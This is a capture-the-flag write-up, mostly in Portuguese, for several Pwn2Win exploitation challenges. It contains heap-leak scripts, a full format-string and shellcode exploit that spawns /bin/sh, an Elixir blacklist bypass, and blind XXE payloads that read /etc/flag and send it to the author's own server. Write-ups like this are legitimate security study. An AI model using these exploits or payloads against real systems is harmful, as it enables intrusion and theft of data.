# Pwn2Win

- [Pwn2Win](#pwn2win)
- [Desafios](#desafios)
  * [Exploitation](#exploitation)
    + [Future Message 1](#future-message-1)
    + [Future Message 2](#future-message-2)
    + [Random Vault (EN)](#random-vault--en-)
    + [Roots Before Branches](#roots-before-branches)
    + [Baby Recruiter (Resolvido)](#baby-recruiter--resolvido-)
  * [Bonus](#bonus)
    + [The last Resort [READ FIRST]](#the-last-resort--read-first-)
    + [g00d b0y](#g00d-b0y)


# Desafios


## Exploitation


### Future Message 1

``` 
Trusted sources have identified a service in HARPA's infrastructured that seems to be the early days of its tecnology used to send messages to the future. This tecnology is extremely important, we need your help to analyse it and extract the secrets that it holds.

Server: futuremessage-pwn2win.southcentralus.cloudapp.azure.com 1337
```

Usando strings encontrei um "flag.txt" no código

Ele parece de inicio chamar uma função que mexe com dois valores em memória, compara com 
            "pi" (3141592654), ele faz outras manipulações com esse valor, usa uns and com 0xFFFF0000 que limpam a metade inferior dos bits, eu imagino que o importante dessa função é entender               o que acontece com esses dois valores, que são usados numa próxima função que é chamada depois dela.

O arquivo flag.txt é lido sempre que seleciona-se a opção de mandar mensagem para o futuro.

O programa faz algumas alocações estranhas, nas quais ele não guarda a região alocada. Acredito que o programa abusa da heap para transmitir variáveis.

Ao mandar mensagem para o futuro, o programa coloca a flag na memoria com um malloc de 48 bytes. Acredito que a ideia é dar free numa região de memória de 48 bytes, alocar a flag(com alta probabilidade de receber o mesmo endereço) e reler a região liberada.


#### Solução
No final o que funcionou foi um heap exploitation. Por algum motivo quando você escreve uma mensagem no programa e apaga ela em seguida, o programa continua imprimindo aquele endereço de memória (lixo) quando solicitado.

Outro comportamento estranho é que o comando de enviar mensagem para o futuro lê um arquivo "flag.txt" e guarda o resultado na heap com um malloc de 48 bytes (e não faz nada com ele).

A solução vêm de unir esses dois comportamentos estranhos com a otimização da heap de sempre empilhar espaços vazios por tamanho.

Inicialmente deve-se escrever e apagar logo em seguida uma mensagem de tamanho 48, pois com isso aquele endereço vazio tem máxima prioridade na heap para outro malloc de 48 bytes. Daí usa-se o comando de enviar mensagem para o futuro, que guarda a flag com um malloc recebendo o mesmo endereço liberado pela mensagem.

Por fim usa-se o comando de imprimir todas as mensagens, que imprime o endereço com a flag.

``` python
from time import sleep

#cria mensagem do tamanho da flag
print("1\nme\n48\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
#apaga a mensagem criada
print("3\n0")
#pausa para a heap se organizar?
sleep(0.1)
#escreve a flag na memoria
print("5")
#imprime e sai
print("4\n6")
```

### Future Message 2 
```
Looks like that the sending message to the future service is evolving! We need your help to keep up with its evolution!

Server: futuremessage-pwn2win.southcentralus.cloudapp.azure.com 1338
```

Uma observação inicial do programa mostra que o bug de imprimir lixo de mensagens deletadas foi corrigido. O que parece mais suspeito é o comando de modificar mensagem porque ele pergunta para o usuário o tamanho da mensagem e colocar tamanho incorreto tem comportamento estranho.

Colocando um tamanho menor do que o da mensagem original, ele continua imprimindo o resto não apagado da mensagem anterior e colocando um maior o programa quebra (sinal de não dar realloc/outro malloc).

Usando a ferramenta de modificar string é possível sobrescrever o '\0' do final da mensagem, permitindo leitura de memória não autorizada.

https://rstforums.com/forum/topic/111449-heap-overflow-exploitation-on-windows-10-explained/

Encontrei esse artigo explicando sobre como exploitar a heap do Windows 10. Eu montei esse código como tentativa, mas ele não consegue vazar a flag. O mais estranho é que para valores de OVERFLOW maiores do que 10 ele para de funcionar.

```python
#A flag aparece perto de um malloc de 64

from time import sleep

#cria uma mensagem de tamanho size com o '\0' removido para vazar memoria
def invalid_message(size):
    cria_chunk(size)
    print("2\n" + str(i_message-1) + "\n" + str(size+OVERFLOW)+ "\n" + (size+OVERFLOW)*'b')

def cria_chunk(size):
    #aqui usa-se size-1 porque size conta com o '\0'
    print("1\nme\n"+ str(size) +"\n" + (size-1)*'a')
    global i_message
    i_message+=1
    #sleep(SLEEP)

def remove_chunk(index):
    print("3\n"+str(index))
    global i_message
    i_message-=1
    sleep(SLEEP)

i_message = 0   #fim da lista de mensagens (primeiro fora da lista)

SLEEP = 0.1
NUM_BASE = 5
TAMANHO_BASE = 64
REMOVIDO = 3
TAMANHO_LEITOR = 64
NUM_LEITORES = 5
OVERFLOW=8
NUM_FLAGS = 5


#cria chunks com o fim de obter algo sequencial
for i in range(NUM_BASE):
    cria_chunk(TAMANHO_BASE)
#deleta um dos chunks com o fim de dar malloc dentro
remove_chunk(REMOVIDO)
#cria leitores de memoria
for i in range(NUM_LEITORES):
    invalid_message(TAMANHO_LEITOR)
#deleta mais um chunk para receber flag
remove_chunk(REMOVIDO)
#escreve flag na memoria
for i in range(NUM_FLAGS):
    print("5")

#imprime e sai
print("4\n6")
```

Percebemos (faltando 10 minutos para o fim do CTF) que aumentar a string de 8 em 8 bytes não quebra o programa e isso nos fornece mais uma estratégia, aumentar uma única mensagem várias vezes até atingir a flag. No final esse código funcionou:

```python
from time import sleep

#cria uma mensagem de tamanho size com o '\0' removido para vazar memoria
def invalid_message(size):
    cria_chunk(size)
    print("2\n" + str(i_message-1) + "\n" + str(size+OVERFLOW)+ "\n" + (size+OVERFLOW)*'b')

def cria_chunk(size):
    #aqui usa-se size-1 porque size conta com o '\0'
    print("1\nme\n"+ str(size) +"\n" + (size-1)*'a')
    global i_message
    i_message+=1
    #sleep(SLEEP)

def remove_chunk(index):
    print("3\n"+str(index))
    global i_message
    i_message-=1
    sleep(SLEEP)

i_message=0
SLEEP = 0.1
OVERFLOW=8

#guarda uma flag na memoria antes de começar
print(5)

#tenta forçar a flag a ser grava próxima a uma das mensagens
cria_chunk(64)
cria_chunk(64)
cria_chunk(64)
cria_chunk(64)
remove_chunk(3)
remove_chunk(2)
for i in range(1):
    #o programa sempre aloca um espaço de 24 bits zerado a toda impressão de flag
    #esse procedimento busca controlar onde isso acontece (provavelmente desnecessario)
    cria_chunk(24)
    remove_chunk(2)
    print(5)

#aumenta aos poucos a string
for i in range(50):
    print("2\n1\n" + str(64+(i*OVERFLOW))+ "\n" + (64+(i*OVERFLOW))*'b')
    print(4)

#guarda mais uma flag na memoria Just in Case
print("5")
print("4")

#aumenta mais a string
for i in range(50,100):
    print("2\n1\n" + str(64+(i*OVERFLOW))+ "\n" + (64+(i*OVERFLOW))*'b')
    print(4)

#finaliza a execução
print("6")
```


### Random Vault (EN)

Writeup em inglês, devemos postar a tradução eventualmente.

```
While analyzing data obtained through our cyber operations, our analysts have discovered an old service in HARPA infrastructure. This service has been used to store the agency's secrets, but it has been replaced by a more sophisticated one after a few years. By mistake, this service remained available on Internet until December 2019, when HARPA agents realized this flaw and took it down. We suspect this service is vulnerable. We need your help to exploit its vulnerability and extract the secrets that are still kept on the server.

Server: 200.136.252.34 1245

Server backup: 68.183.204.108 1245

https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/random_vault_679bf5b114c21f564eadec9b0016fb7bf3d9d100141afae8b59d1d44ee60ff31.tar.gz
```


https://javascript.is-bad.com/5RVdKN6.gzf
projeto do ghidra com as funções desobfuscadas e parcialmente
documentadas

After renaming a TON of stuff in ghidra, this is how the code looks:

![Main function](https://i-was-scammed-by.dabbot.org/53pZHpu.png "Main function")

![Read username function](https://i-was-scammed-by.dabbot.org/3nxas2e.png "Only allows one change")

Resets are basically
```c
  memset(EXECUTABLE_BUFFER,0,0xff0);
  CODE = code_default_address;
  now = time(NULL);
  NOW = (uint)now;
```

CODE is a global variable that holds an address to be executed after storing secrets.
EXECUTABLE_BUFFER is a buffer with read, write and execution permissions, so shellcode can
be stored there.
NOW stores a timestamp for seeding rand()

![Greet function](https://i-was-scammed-by.dabbot.org/2G6b59Y.png "Vulnerable to format string exploits")

`print_actions` calls `greet` and lists available actions.

Playing around with format string exploits, you can obtain the address `greet` returns to,

The 11th `%p` argument gives that address. Knowing it's offset can be found by searching for it's
bytes (which can be obtained from ghidra) with objdump in the binary.

```
 » alias disass='objdump -D random_vault -j .text -M intel'
 
 » disass | grep '48 8d 3d 7a 09 00 00'
     1750:	48 8d 3d 7a 09 00 00 	lea    rdi,[rip+0x97a]
```

Subtracting 0x1750 from the return address yields the base address for the code. `$BASE_ADDR = <pointer> - 0x1750`

Now to look for where the executable buffer is populated:

![Buffer write](https://javascript.is-bad.com/Hn7AfG4.png "Data written to executable buffer")

Looking at the disassembly, we can see this:

![Disassembly](https://javascript.is-bad.com/6bvi8Uu.png "Shows a load of the buffer address")

Back to objdump:
```
 » disass | grep '48 8d 05 2f 3a 00 00' -A 1
    15da:	48 8d 05 2f 3a 00 00 	lea    rax,[rip+0x3a2f]        # 5010 <stderr@@GLIBC_2.2.5+0x30>
    15e1:	48 01 d0             	add    rax,rdx
```

The buffer is located at `$BASE_ADDRESS + 0x15e1 + 0x3a2f` (remember RIP points to the *next* instruction)

It also calls `(*CODE)()`:
![More disassembly](https://i-was-scammed-by.dabbot.org/7kH8KBT.png "Dereferences CODE and calls it")

```
 » disass | grep '48 8b 15 e6 39 00 00' -A 1
    1613:	48 8b 15 e6 39 00 00 	mov    rdx,QWORD PTR [rip+0x39e6]        # 5000 <stderr@@GLIBC_2.2.5+0x20>
    161a:	b8 00 00 00 00       	mov    eax,0x0
```

The variable is at `$BASE_ADDRESS + 0x161a + 0x39e6` (in the python script below I used 0x1355 and 0x3cab,
since I got the address from another function, but both pairs add up to the same value)

To write the shellcode, I needed to figure out the offsets used in `store_secret`, so I extracted the
code that generates the offsets to a file and ran it.

If you notice the scanf specifier, only 8 bytes can be read, so the shellcode must be stitched together
with jumps. To avoid wasting precious bytes with jumps, I wanted to use the `JMP rel8` variant of it, which
adds a signed 8 bit integer to RIP, using up 2 bytes of space. But that requires that the addresses be close
to each other, which needed some brute forcing, with the following program:

`gcc source.S source.c -O3 -o brute && ./brute`

`3764` was the chosen seed (it was the lowest one, and made exploiting printf easier).

```asm
.intel_syntax noprefix

// int32_t get_next_index(int32_t secret_idx, int32_t* buffer)
get_next_index: .globl get_next_index
    push rbp
    mov rbp, rsp

    push rsi
    push rdi
    call rand
    pop rdi
    pop rsi
    cdq // Convert Doubleword to Quadword
        // The CDQ instruction copies the sign (bit 31) of the
        // value in the EAX register into every bit position in
        // the EDX register.
    shr edx, 0x18
    add eax, edx
//  too much effort to figure out what were the actual registers
//  so i just copied the bytes 1:1 from ghidra
//  start movzx
    .byte 0x0f
    .byte 0xb6
    .byte 0xc0
//  end   movzx
    sub eax, edx
    mov edx, eax
    mov eax, edi
    cdqe
    mov dword ptr [rsi + rax*0x4 - 0x30], edx
    mov eax, edi
    cdqe
    mov eax, dword ptr [rsi + rax*0x4 - 0x30]
    cdqe
    lea rdx, [eax * 0x8]
    mov rax, rdx

    pop rbp
    ret
```

```c 
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int32_t get_next_index(int32_t secret_idx, int32_t *buffer);

void gen(int32_t* dest) {
    int32_t buffer[2000] = {0};
    for(int32_t i = 0; i < 7; i++) { dest[i] = get_next_index(i, &buffer[1000]); }
}

int sort_fn(const void* a, const void* b) { return *(int*)a - *(int*)b; }

int main(void) {
    int32_t numbers[7];
    for(int32_t S = 0; S < 30000; S++) {
        srand(S);
        gen(numbers);
        qsort(numbers, 7, sizeof(int32_t), sort_fn);
        int found = 1;
        for(int32_t i = 0; i < 6; i++) {
            if(numbers[i + 1] - numbers[i] > 127) {
                found = 0;
                break;
            }
        }
        if(found) {
            printf("%d: ", S);
            for(int32_t i = 0; i < 7; i++) {
                printf("%d (+%d), ", numbers[i], 
                        i > 0 ? numbers[i] - numbers[i-1] : 0);
            }
            printf("\n  raw:");
            srand(S);
            gen(numbers);
            for(int32_t i = 0; i < 7; i++) { printf("%d ", numbers[i]); }
            printf("\n");
        }
    }
    return 0;
}
```

This writes our shellcode in the offsets `352, 272, 160, 496, 472, 544, 408`.
A bit of hand-written assembly later, I ended up with 

```asm
   0:	48 8d 7c 24 f8       	lea    rdi,[rsp-0x8]
   5:	eb 70                	jmp    77 <shellcode+0x77>
  
   7:	66 c7 47 06 68 00    	mov    WORD PTR [rdi+0x6],0x68
   d:	eb 50                	jmp    5f <shellcode+0x5f>
  
  f:	66 c7 47 04 2f 73    	mov    WORD PTR [rdi+0x4],0x732f
  15:	eb 38                	jmp    4f <shellcode+0x4f>
  
  17:	66 c7 47 02 69 6e    	mov    WORD PTR [rdi+0x2],0x6e69
  1d:	eb 40                	jmp    5f <shellcode+0x5f>
  
  1f:	66 c7 07 2f 62       	mov    WORD PTR [rdi],0x622f
  24:	eb 18                	jmp    3e <shellcode+0x3e>

  26:	b0 3b                	mov    al,0x3b
  28:	31 f6                	xor    esi,esi
  2a:	31 d2                	xor    edx,edx
  2c:	0f 05                	syscall 
```

which is equivalent to `execve("/bin/sh", NULL, NULL)`, with the difference that it'll definitely
crash the process when it returns.

The grouped lines are the 8-byte-or-less instruction groups that can be written, and must be written
to the first 6 offsets, from lower to higher. The seventh one can be whatever garbage you want, it won't
be executed.

In python:

```python
shellcode = [
    [ 0x66, 0xc7, 0x47, 0x04, 0x2f, 0x73, 0xeb, 0x38 ],  # 352
    [ 0x66, 0xc7, 0x47, 0x06, 0x68, 0x00, 0xeb, 0x50 ],  # 272
    [ 0x48, 0x8d, 0x7c, 0x24, 0xf8, 0xeb, 0x70 ],        # 160
    [ 0xb0, 0x3b, 0x31, 0xf6, 0x31, 0xd2, 0x0f, 0x05 ],  # 496
    [ 0x66, 0xc7, 0x07, 0x2f, 0x62, 0xeb, 0x18 ],        # 472
    [ 0xcc, 0xce ],                                      # 544
    [ 0x66, 0xc7, 0x47, 0x02, 0x69, 0x6e, 0xeb, 0x40 ],  # 408
]
for line in shellcode:
    if line[-1] != 0x05:
        line[-1] -= len(line)
```

The decrement is used to adjust the jump offsets to account for the RIP advancing, as they
were compiled as if RIP were the first instruction in each block. `[ 0xcc, 0xce ]` will just become
two int3s, but it could be anything you wanted. The if is needed to not corrupt the `syscall` instruction.

Now to jump into the shellcode.

We need to overwrite `CODE` so it points into the beginning of the shellcode. The value stored there
by default is `$BASE_ADDR + 0x134e + 0xfffffffffffffefd`, which is `$BASE_ADDR + 0x134e - 259`:

![More Ghidra Disassembly](https://javascript.is-bad.com/6wXvFTc.png "Disassembly of the default value")

```
 » disass | grep '48 8d 05 fd fe ff ff' -A 1
    1347:	48 8d 05 fd fe ff ff 	lea    rax,[rip+0xfffffffffffffefd]        # 124b <__cxa_finalize@plt+0x14b>
    134e:	48 89 05 ab 3c 00 00 	mov    QWORD PTR [rip+0x3cab],rax        # 5000 <stderr@@GLIBC_2.2.5+0x20>
```

This address will have most of it's bits equal to the shellcode address, so we can overwrite only what's different. However, it's still far enough that in some runs they'll have more than just the last two bytes differering, which makes it unusable. Just try again until it's something usable.

```python
if current_code_ptr_val >> 16 != shellcode_addr >> 16:
    log.error("More than 16 bits of difference! Please re-run")
    import sys
    sys.exit(1)

# Since only the last 16 bits are different, we can write only those
value_to_write = shellcode_addr & 0xFFFF
```

Now to overwrite the seed:

![Seed location](https://i-was-scammed-by.dabbot.org/6PZzKJw.png "Disassembly of the seed loading")

```
 » disass | grep '8b 05 85 3a 00 00' -A 1
    157d:	8b 05 85 3a 00 00    	mov    eax,DWORD PTR [rip+0x3a85]        # 5008 <stderr@@GLIBC_2.2.5+0x28>
    1583:	89 c7                	mov    edi,eax
```

`NOW = $BASE_ADDR + 0x1583 + 0x3a85`

The payload for writing the data is now

```python
# 3764 chars are written for the seed, so we need to write N - 3764
# chars to get the count to the value needed for the shellcode address
# but if the value is too small, it'd fail
if value_to_write < 3764:
    log.error("Value to write too small, please try again")
    import sys
    sys.exit(1)
value_to_write -= 3764

payload = ""
payload += "%03764d"                        # write 3764 characters, so we can overwrite the seed
payload += "%29$n"                          # overwrite time (aka seed) var. %n is an int, which is
                                            # 4 bytes (same size as the seed) in x86-64. This will
                                            # set it to exactly 3764, overwriting all previous bits.
payload += "%0" + str(value_to_write) + "d" # overwrite least significant address bits
                                            # the actual needed value needs to have 3764 subtracted
                                            # from it because we already wrote that many characters
                                            # for the seed.
payload += "%28$hn"                         # overwrite code pointer. %hn is a short, which is the
                                            # two first bytes in a little endian architecture, so
                                            # the pointer value is already right.
                                            # if it wasn't, we could just do pointer math to set the
                                            # address to the least significant bytes
payload += "P"*(8 - (len(payload) % 8))     # align the payload to 8 bytes, so the next two
                                            # addresses can be accessed
payload += p64(code_ptr_addr)               # this is the 28th value
payload += p64(current_time_addr)           # this is the 29th value
```

Now the only thing left to do is sending the shellcode, which can be done with

```python
def pack_shellcode(sc):
    return str(struct.unpack("<Q", ''.join([
        chr(x) for x in sc
    ]))[0])

def send_shellcode(s):
    send_command("2")
    for part in s:
        if len(part) > 8:
            raise Exception("Cannot write shellcode part with more than 8 bytes")
        part = part + [0xCC] * (8 - len(part))
        send_command(pack_shellcode(part))
    for i in range(7 - len(s)):
        send_command(breakpoints)
```

Final exploit:

```python
#!/bin/env python2
from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

#p = process("./random_vault")

#gdb.attach(p, 'continue')

p = remote("200.136.252.34", 1245)

def pack_shellcode(sc):
    return str(struct.unpack("<Q", ''.join([
        chr(x) for x in sc
    ]))[0])

breakpoints = pack_shellcode([0xCC] * 8)

# EXECUTABLE_CODE buffer load:
#     15da:	48 8d 05 2f 3a 00 00 	lea    rax,[rip+0x3a2f]        # 5010 <stderr@@GLIBC_2.2.5+0x30>
#     15e1:	48 01 d0             	add    rax,rdx 
buffer_start_offset=0x15e1 + 0x3a2f
buffer_offsets = [
    352, 272, 160, 496, 472, 544, 408
]

shellcode = [
    [ 0x66, 0xc7, 0x47, 0x04, 0x2f, 0x73, 0xeb, 0x38 ],  # 352
    [ 0x66, 0xc7, 0x47, 0x06, 0x68, 0x00, 0xeb, 0x50 ],  # 272
    [ 0x48, 0x8d, 0x7c, 0x24, 0xf8, 0xeb, 0x70 ],        # 160
    [ 0xb0, 0x3b, 0x31, 0xf6, 0x31, 0xd2, 0x0f, 0x05 ],  # 496
    [ 0x66, 0xc7, 0x07, 0x2f, 0x62, 0xeb, 0x18 ],        # 472
    [ 0xcc, 0xce ],                                      # 544
    [ 0x66, 0xc7, 0x47, 0x02, 0x69, 0x6e, 0xeb, 0x40 ],  # 408
]
for line in shellcode:
    if line[-1] != 0x05:
        line[-1] -= len(line)


# shellcode
"""
0000000000000000 <shellcode>:
   0:	48 8d 7c 24 f8       	lea    rdi,[rsp-0x8]
   5:	eb 70                	jmp    77 <shellcode+0x77>
  
   7:	66 c7 47 06 68 00    	mov    WORD PTR [rdi+0x6],0x68
   d:	eb 50                	jmp    5f <shellcode+0x5f>
  
  f:	66 c7 47 04 2f 73    	mov    WORD PTR [rdi+0x4],0x732f
  15:	eb 38                	jmp    4f <shellcode+0x4f>
  
  17:	66 c7 47 02 69 6e    	mov    WORD PTR [rdi+0x2],0x6e69
  1d:	eb 40                	jmp    5f <shellcode+0x5f>
  
  1f:	66 c7 07 2f 62       	mov    WORD PTR [rdi],0x622f
  24:	eb 18                	jmp    3e <shellcode+0x3e>

  26:	b0 3b                	mov    al,0x3b
  28:	31 f6                	xor    esi,esi
  2a:	31 d2                	xor    edx,edx
  2c:	0f 05                	syscall 

    lea rdi, [rsp-8]
    .byte 0xEB
    .byte 112
    mov word ptr[rdi+6], 0x68
    .byte 0xEB
    .byte 80
    mov word ptr[rdi+4], 0x732f
    .byte 0xEB
    .byte 56
    mov word ptr[rdi+2], 0x6e69
    .byte 0xEB
    .byte 64
    mov word ptr[rdi], 0x622f
    .byte 0xEB
    .byte 24

    mov al, 59
    xor esi, esi
    xor edx, edx
    syscall
"""

# need to find a return address (with printf leak), subtract from it the
# relative address of the instruction and obtain the program base address

# the address of the buffer can be obtained with `base_addr + buffer_start_offset`
# the address of the function currently stored in CODE can be calculated knowing
# it's relative address and the base address.
# finding the different bytes (which are the least significant) between the known
# shellcode location and the function is simple math, then the different bytes need
# to be written with printf

# step 1: leak a return address with the first printf string
# step 2: use the second printf string to overwrite CODE to
#         the address of the shellcode
# step 3: write the shellcode, which will instantly run it when done


# leaking return address
# printing with %p, the 11th value is the return address of the function calling
# printf, specifically the address of `lea    rdi,[rip+0x97a]`, which has relative
# address 0x1750

def send_command(c):
    log.debug("===> %s" % c)
    p.send(c + "\n")

def read_until(s):
    while True:
        line = p.recvline()
        log.debug("<=== %s" % line)
        if line.startswith(s):
            return line

def send_shellcode(s):
    send_command("2")
    for part in s:
        if len(part) > 8:
            raise Exception("Cannot write shellcode part with more than 8 bytes")
        part = part + [0xCC] * (8 - len(part))
        send_command(pack_shellcode(part))
    for i in range(7 - len(s)):
        send_command(breakpoints)
#    send_command("y")

# Send fake username
send_command("%p," * 11)
username = read_until("Hello, ")
log.info("Leaked username: %s" % username)
return_addr=int(username.split(",")[11], 16)
log.info("Leaked return address: %s" % hex(return_addr))
base_addr=return_addr - 0x1750
log.info("Base address: %s" % hex(base_addr))

buffer_start = base_addr + buffer_start_offset
log.info("Buffer starts at %s" % hex(buffer_start))

shellcode_addr = buffer_start + min(buffer_offsets)
log.info("First shellcode goes to %s" % hex(shellcode_addr))

code_ptr_addr = base_addr + 0x1355 + 0x3cab
log.info("Called address goes in %s" % hex(code_ptr_addr))

current_code_ptr_val = base_addr + 0x134e - 259
log.info("Called address current value is %s" % hex(current_code_ptr_val))

if current_code_ptr_val >> 16 != shellcode_addr >> 16:
    log.error("More than 16 bits of difference! Please re-run")
    import sys
    sys.exit(1)

value_to_write = shellcode_addr & 0xFFFF
log.info("Need to write %s/%d" % (hex(value_to_write), value_to_write))

current_time_addr = base_addr + 0x1583 + 0x3a85
log.info("Need to overwrite time at %s" % hex(current_time_addr))

log.info("Break at %s to stop before running shellcode" % hex(base_addr + 0x161f))

# diff = buffer_start - current_code_ptr_val
# (could be done with the offsets only, but since i can run code i might as
#  well just use what i already have)
# > diff = 0b100000011111101
# print(len("{0:b}".format(diff)))
# > 15
#
# only 15 bits are different, so we only need to overwrite two bytes with printf
# and since they're the least significant bytes, they're the first two in x86
# (which is a little endian architecture)
#
# so we set the format string to print `diff` characters then use %n to overwrite
# `code_ptr_addr`

log.info("Overwriting time and code pointer")
send_command("1") # change username

# 3764 chars are written for the seed, so we need to write N - 3764
# chars to get the count to the value needed for the shellcode address
# but if the value is too small, it'd fail
if value_to_write < 3764:
    log.error("Value to write too small, please try again")
    import sys
    sys.exit(1)
value_to_write -= 3764

# 19 * 8 bytes before the buffer on the stack
# + 5 arguments in registers
payload = ""
payload += "%03764d"                        # write 3764 characters, so we can overwrite the seed
payload += "%29$n"                          # overwrite time (aka seed) var. %n is an int, which is
                                            # 4 bytes (same size as the seed) in x86-64. This will
                                            # set it to exactly 3764, overwriting all previous bits.
payload += "%0" + str(value_to_write) + "d" # overwrite least significant address bits
                                            # the actual needed value needs to have 3764 subtracted
                                            # from it because we already wrote that many characters
                                            # for the seed.
payload += "%28$hn"                         # overwrite code pointer. %hn is a short, which is the
                                            # two first bytes in a little endian architecture, so
                                            # the pointer value is already right.
                                            # if it wasn't, we could just do pointer math to set the
                                            # address to the least significant bytes
payload += "P"*(8 - (len(payload) % 8))     # align the payload to 8 bytes, so the next two
                                            # addresses can be accessed
payload += p64(code_ptr_addr)               # this is the 28th value
payload += p64(current_time_addr)           # this is the 29th value
send_command(payload)
read_until("Hello, ")

raw_input("press enter to run shellcode...")
log.info("Sending and running shellcode")
send_shellcode(shellcode)

log.info("Enjoy :)")
p.interactive()
```

### Roots Before Branches
```
We intercepted Sophia new defense system. It seems like she is using some kind of filter in the command sent to a certain server. There is also another security measure that we could not identify, we need a bypass.

Server: 200.136.252.46 4000

Server backup: 159.203.47.1 4000


https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/roots_before_branches_8a270ed1f722a026ceeb53739c58afe1b99543f1ec7b5497a6c9e0a128d610b0.tar.gz
```

Rodando o programa (depois de 30 minutos de docker build), ele printa

```
Inserting 'Elixir.KillMe.Server', get_flag into blacklist
Blacklist now 'Elixir.KillMe.Server', get_flag
```

Conectando com netcat, e enviando `1`, ele responde com `{1, []}`, que é um valor de
elixir/erlang. Assumi que era execução de código arbitrário e que o objetivo é chamar
a função KillMe.Server.get_flag. Como ela está blacklistada, é necessário achar outro
método de chamar ela. Usando a função `apply/3`, é possível rodar funções arbitrárias
de módulos arbitrários. Ela também está blacklistada, como pode ser visto:
```
» nc 127.0.0.1 4000                                           my@laptop
&apply/3
"This is blacklisted"  
```

`apply(...)` é equivalente à `:erlang.apply(...)`. É possível chamar funções com o modulo
sendo um valor, `(hd [:erlang]).apply(...)`, que não é blacklistado:

```
» nc 127.0.0.1 4000                                           my@laptop
(hd [:erlang]).apply(IO, :puts, ["Hello World"])
{:ok, []}  
```

Portanto:

```
» nc 127.0.0.1 4000                                           my@laptop
(hd [:erlang]).apply(KillMe.Server, :get_flag, [])
{"CTF-BR{something_here}", []}  
```

Rodando no servidor resulta na flag.


### Baby Recruiter
```
We found a Curriculum service from HARPA. Well, what do you think about pwn it? :)

P.S.: the flag is not in default format, so add CTF-BR{} when you find it (leet speak).
```

Inicialmente, analisamos os três arquivos fornecidos: Dockerfile, index.php e iptables<i></i>.sh.

No dockerfile, são atualizados e instalados diversos programas, dentre eles o prince xml versão 12.5. Além disso, dois arquivos sem informação relevante são criados: **`/etc/flag`** e `resumes/index.html` (este, de fato, vazio).

Ainda no dockerfile, a pasta resumes é criada e nela são atribuídas permissões máximas: `chmod 777 resumes`. E, por fim, o script iptables<i></i>.sh é executado.

No iptables<i></i>.sh, aparentemente, apenas conexões de entrada na porta 80 são permitidas para novos hosts. E de saída, apenas a 53. (A 80 é OUT ESTABILISHED).

Ao adentrar o index.php, nota-se que este executa o prince para transformar o conteúdo enviado na textarea por POST em PDF. Porém, para fazer isso, é necessário salvar o XML no disco, e isso é feito na pasta tmp: `/tmp/md5(meu_ip).html`. Após salvar no disco, o index.php executa o esguinte comando: 

*Trecho I*
```shell
prince --no-local-files /tmp/md5(meu_ip).html -o resumes/md5(meu_ip)
```

Sabemos, pelo dockerfile, que a tag está em `/etc/flag`, portanto focamos em descobrir uma maneira de usar o XML, PrinceXML ou o PDF para acessar tal arquivo.

O primeiro resultado no Google mostra uma vulnerabilidade que não se aplica mais, pois a versão instalada é superior a 10 (12.5).

Então, partimos para a abordagem de polyglot files, porém logo percebemos que o prince filtrava o conteúdo que ele convertia, de modo a remover o bloco de código necessário para fazer uma polyglot file (PDF + PHP).

Atualmente, voltamos a focar em XXE, buscando uma forma de dar bypass nas defesas do prince e colocar o conteúdo de `/etc/flag` no PDF gerado.

Por padrão, no prince, a execução de XXE é desativada, mas pode ser habilitada com o switch --xxe. Porém, mesmo que consigamos fazê-lo, ainda há o outro switch --no-local-files que impede a leitura de arquivos no servidor a partir do prince. (Ver *Trecho I*)

```bash
prince --xxe /tmp/md5(meu_ip).html -o resumes/md5(meu_ip)
```

Se fosse possível alterar a linha de código executado no *Trecho I* para a linha acima, seria possível obter a flag ao enviar o seguinte xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo 
[ <!ENTITY xxe SYSTEM "file:///etc/flag"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
</stockCheck>
```

Após tentarmos de várias formas um XXE Injection por meio do Prince, pensou-se que a vulnerabilidade poderia estar relacionada a este trecho de código:
```php
/* debug */
$dom = new DOMDocument();
$dom->loadXML($content, LIBXML_NOENT | LIBXML_DTDLOAD);
$info = simplexml_import_dom($dom);
```

Esse trecho carrega um XML que só era utilizado para debug, mas não foi descomentado). Tendo isso em vista, parecia possível realizar um Blind XXE Injection através da textarea presente na página */index.php*. 

O único problema é que o servidor do chall não permitia nenhuma conexão externa do tipo NEW, apenas ESTABILISHED, exceto na porta 53, destinada ao servidor DNS. Portanto, basta derrumar o servidor DNS da nossa máquina com: **sudo systemctl stop systemd-resolved** e subir o servidor local na porta 53. 

Feito isso, enviou-se o payload através do textarea (dando submit):
``` xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://<my-server-ip>/host.dtd">
<data>&send;</data>
```
*Payload I* - Enviado via campo content no POST do index.php

Ao carregar o XML no servidor do desafio, ele busca no nosso servidor local esse outro payload:
```
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://<my-server-ip>/collect/%file;'>">
%eval;
```
*Payload II* - Mantido no servidor local para ser requisitado pelo servidor do chall via XXE pelo primeiro payload

Ao realizar a requisição GET *http://<my-server-ip>/collect/%file;*, é enviado o %file;, que contém a flag, para o nosso servidor local.



## Bonus

### The last Resort [READ FIRST]
`CTF-BR{br0adc4s7_#01_succe55fully_r3c31v3d}`

Só ler o enunciado e pegar a flag

### g00d b0y
`CTF-BR{RTFM_1s_4_g00d_3xpr3ss10n_v5.0}`

Desafio bônus, flag nas letras miúdas das regras.

